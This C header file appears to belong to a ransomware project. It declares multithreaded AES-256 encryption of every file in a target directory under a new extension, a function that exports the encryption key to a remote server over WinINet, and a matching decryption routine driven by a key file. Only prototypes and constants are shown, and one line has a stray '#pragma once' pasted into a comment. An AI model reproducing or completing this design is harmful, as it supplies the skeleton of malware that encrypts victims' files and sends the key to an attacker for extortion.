#include <windows.h>
#include <bcrypt.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")

// Constants
#define MIN_THREADS 1           // min number of threads#pragma once
#define MAX_EXT 8				// maximum extension length

#define AES256_KEY_LENGTH 32					// AES key length in bytes (256 bits is the maximum supported by BCRYPT_AES_ALGORITHM)
#define AES256_BLOCK_SIZE  16					// for AES256 the block size is 16 bytes (128 bits)
#define AES256_IV_SIZE AES256_BLOCK_SIZE		// the IV length will be the same as block size

#define CHUNK_SIZE 4096							// files will be encrypted in chunks of this size. Must be a multiple of the block size
#define ENC_CHUNK_SIZE CHUNK_SIZE + AES256_BLOCK_SIZE

// Defined in utils.c
errno_t my_strcat_s(char* destinationStr, size_t MaxSize, const char* sourceStr);
void GetTime(ULARGE_INTEGER* time);
int getNumberOfProcessors(DWORD* logicalProcessors);

// Defined in trheads.c
BOOL InitThreadPool(TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP* cleanupgroup, DWORD threadNum);
size_t StartEncryptionWithThreads(char* targetDir, const char* cryptoFileExt, size_t* encryptedFileNumber, BCRYPT_KEY_HANDLE hKey, BCRYPT_ALG_HANDLE* hRng, TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP cleanupgroup, DWORD threadNum);
size_t startDecryptionWithThreads(char* targetDir, const char* cryptoFileExt, size_t* decryptedFileNumber, BCRYPT_KEY_HANDLE hKey, TP_CALLBACK_ENVIRON* poolEnv, PTP_CLEANUP_GROUP cleanupgroup, DWORD threadNum);

// Defined in crypto.c
NTSTATUS initCrypto(BCRYPT_ALG_HANDLE* hAlgProv, BCRYPT_ALG_HANDLE* hRng, BCRYPT_KEY_HANDLE* hKey);
BOOL initDeCrypto(BCRYPT_ALG_HANDLE* hAlgProv, BCRYPT_KEY_HANDLE* hKey, const char* keyFile);
BOOL ExportKey(BCRYPT_ALG_HANDLE* hCryptProv, BCRYPT_KEY_HANDLE* hKey, const char* serverName, INTERNET_PORT serverPort);